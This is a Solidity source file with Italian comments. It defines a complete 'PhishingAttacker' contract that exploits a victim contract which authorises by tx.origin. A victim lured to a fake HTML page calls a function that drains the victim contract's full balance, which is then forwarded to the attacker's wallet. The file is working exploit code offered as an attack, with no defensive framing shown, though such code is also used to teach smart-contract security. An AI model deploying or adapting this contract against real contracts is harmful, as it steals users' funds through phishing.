// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @notice Interfaccia del contratto vittima vulnerabile con `tx.origin`
interface IVictim {
    function withdrawAll(address payable _to) external;
}

/// @title PhishingAttacker
/// @notice Contratto attaccante che sfrutta la vulnerabilità `tx.origin`
/// per trasferire fondi dal contratto vittima a sé stesso, e successivamente
/// li invia al wallet dell’attaccante.
contract PhishingAttacker {
    address payable public attackerWallet; // wallet dell’attaccante che riceverà i fondi

    constructor(address payable _attackerWallet) {
        attackerWallet = _attackerWallet;
    }

    /// @notice Funzione phishing chiamata dalla VITTIMA tramite una pagina HTML fake.
    /// L’indirizzo del contratto vittima viene passato come parametro.
    /// Esegue il prelievo dal contratto vittima a questo contratto.
    function initiatePhishing(address _victimContract) public {
        IVictim victim = IVictim(_victimContract);
        victim.withdrawAll(payable(address(this))); // i fondi arrivano QUI
    }

    /// @notice Funzione da chiamare dal wallet dell’attaccante per prelevare i fondi rubati.
    function forwardFunds() public {
        require(msg.sender == attackerWallet, "Not authorized");
        attackerWallet.transfer(address(this).balance);
    }

    /// @notice Per ricevere ETH dal contratto vittima
    receive() external payable {}
}
